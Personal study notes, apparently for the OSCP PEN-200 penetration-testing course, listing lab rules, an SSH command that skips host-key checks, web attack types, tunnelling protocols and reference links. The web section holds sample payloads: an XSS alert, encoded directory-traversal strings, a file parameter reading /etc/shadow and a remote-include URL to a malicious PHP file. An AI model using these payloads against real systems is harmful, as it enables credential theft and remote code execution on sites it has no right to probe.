# Intro OSCP PEN-200

**The flag must be submitted before reverting or powering off the machine.**
**Exercise Host are x86-64 Kali Linux version exclusively**
**Extecise Host require to use SSH without Hostfile checks**
**Use IP addresses assigned to you via TUN0 and via the OLP**
**Scenario (lab 1-3) machines contain either local.txt file, proof.txt file, or both**
**Challenge (lab 4-6) contains six OSCP machines similar to exam.**
**3 VMs in the AD (40p), 3 scenario VMs with proof.txt or/and local.txt files (60p)**

## Exam

**OSCP exam requires a final report based on Report Writing for Penetration Testers**

## Help

[Offsec Help](https://help.offsec.com/)

[Offsec FAQs](https://help.offsec.com/hc/en-us/categories/360002666252-General-Frequently-Asked-Questions-FAQs)

## SSH Login without Hostfile checks

```bash
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@remote-ip
```

## Active Directory Resources

[AD Getting started](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview)

## Web Application Attacks

* Cross-Side-Scripting (XSS) - target client browsers with HTML or scripts `<script>alert('XSS')</script>`
  * [Output Injection to client browsers](https://www.offsec.com/offsec/what-is-xss/)
  * does NOT require Cross-Side
  * does NOT require Scripting
* Directory Traversal - aims to access files and folders out-side of the web root
  *[Access by Manipulation of relative or absolute path](https://owasp.org/www-community/attacks/Path_Traversal)
  * make USE double encoding
    * `%2e%2e%2f` represents `../`
    * `%2e%2e/` represents `../`
    * `..%2f` represents `../`
    * `%2e%2e%5c` represents `..\`
    * `%2e%2e\` represents `..\`
    * `..%5c` represents `..\`
    * `%252e%252e%255c` represents `..\`
    * `..%255c` represents `..\`
  * make USE URL encoding
    * `..%c0%af` represents `../`
    * `..%c1%9c` represents `..\`
  * may LOAD of internal or external resources
    * `...?file=/etc/shadow`
    * `...?file=/var/www/html/get.php`
    * `...?page=http://server.com/malicious.php`

* File Inclusion or Upload - upload the exploit
* Command Injection - run the exploit code
* SQL Injection - read, update the SQL database

## Perimeter Attacks

Find exploits <https://www.exploit-db.com/>

## Tunnels

Common Cyber-Attack tunnel protocols

* SSH Tunnel: (Layer 2 tap, Layer 3 tun)
* SOCKS 4/5
* DNS
* MQTT
* HTTP with/out CONNECT  

e.g.

```plain
CONNECT another-server.com:22 HTTP/1.1
Proxy-Authorization: Basic encoded-credentials
...
HTTP/1.1 200 OK
```

Common tunneling protocols

* IP in IP (Protocol 4): IP in IPv4/IPv6
* SIT/IPv6 (Protocol 41): IPv6 in IPv4/IPv6
* GRE (Protocol 47): Generic Routing Encapsulation
* OpenVPN (UDP port 1194)
* SSTP (TCP port 443): Secure Socket Tunneling Protocol
* IPSec (Protocol 50 and 51): Internet Protocol Security
* L2TP (Protocol 115): Layer 2 Tunneling Protocol
* VXLAN (UDP port 4789): Virtual Extensible Local Area Network.
* GENEVE
* WireGuard

## Security Principle

* David Whelers website <https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/follow-good-principles.html> 
* OWASP cheatsheet <https://cheatsheetseries.owasp.org/cheatsheets/Secure_Product_Design_Cheat_Sheet.html#security-principles>

## Standards and Frameworks

* PCI DSS: The Payment Card Industry Data Security Standard 
* CIS 18: CIS Controls
* NIST Cybersecurity Framework
* Mitre Att&ck and D3fend
* Cyber Kill Chain
* FedRamp: US Federal Risk and Authorization Management Program based on NIST SP 800-53 Revision 4 

## Cheatsheets

* Active Directory `https://swisskyrepo.github.io/InternalAllTheThings`
* Penetration Test `https://swisskyrepo.github.io/InternalAllTheThings`
* Hacktricks.xyz   `https://book.hacktricks.xyz/`



